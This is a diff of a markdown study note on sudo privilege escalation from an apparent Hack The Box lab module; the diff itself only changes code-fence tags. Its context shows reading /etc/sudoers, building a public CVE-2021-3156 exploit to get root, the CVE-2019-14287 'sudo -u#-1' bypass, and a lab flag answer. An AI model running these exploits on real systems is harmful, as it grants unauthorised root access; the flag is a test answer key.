@@ -1,7 +1,7 @@
 # Sudo
 The program sudo is used under UNIX operating systems like Linux or macOS to start processes with the rights of another user. The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.
 
-```sh
+```shellsession
 $ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
 [sudo] password for cry0l1t3:  **********
 
@@ -18,7 +18,7 @@ cry0l1t3        ALL=(ALL) /usr/bin/id
 
 To find out the version of sudo, the following command is sufficient:
 
-```sh
+```shellsession
 $ sudo -V | head -n1
 
 Sudo version 1.8.31
@@ -26,7 +26,7 @@ Sudo version 1.8.31
 
 One of the latest vulnerabilities for sudo carries the [CVE-2021-3156](https://github.com/blasty/CVE-2021-3156) and is based on a heap-based buffer overflow vulnerability.
 
-```sh
+```shellsession
 $ git clone https://github.com/blasty/CVE-2021-3156.git
 $ cd CVE-2021-3156
 $ make
@@ -71,7 +71,7 @@ uid=0(root) gid=0(root) groups=0(root)
 ## Sudo Policy Bypass
 Another vulnerability was found in 2019 that affected all versions below 1.8.28, which allowed privileges to escalate even with a simple command. This vulnerability has the CVE-2019-14287 and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.
 
-```sh
+```shellsession
 $ sudo -l
 [sudo] password for cry0l1t3: **********
 
@@ -81,7 +81,7 @@ User cry0l1t3 may run the following commands on Penny:
 
 In fact, Sudo also allows commands with specific user IDs to be executed, which executes the command with the user's privileges carrying the specified ID. The ID of the specific user can be read from the `/etc/passwd` file.
 
-```sh
+```shellsession
 $ cat /etc/passwd | grep cry0l1t3
 
 cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
@@ -89,7 +89,7 @@ cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
 
 Thus the ID for the user `cry0l1t3` would be `1005`. If a negative ID (`-1`) is entered at sudo, this results in processing the ID `0`, which only the `root` has. This, therefore, led to the immediate root shell.
 
-```sh
+```shellsession
 $ sudo -u#-1 id
 
 root@nix02:/home/cry0l1t3# id
@@ -102,7 +102,7 @@ SSH to 10.129.205.110 (ACADEMY-LLPE-SUDO), with user `htb-student` and password 
 1. Escalate the privileges and submit the contents of flag.txt as the answer. **Answer: HTB{SuD0_e5c4l47i0n_1id}**
    - Check sudo version → vulnerable to CVE-2019-14287:
    - Notice we can run ncdu as any user except root, but combined with CVE-2019-14287 we can leverage it to gain root:
-        ```sh
+        ```shellsession
         $ sudo  -l
         Matching Defaults entries for htb-student on ubuntu:
             env_reset, mail_badpass,
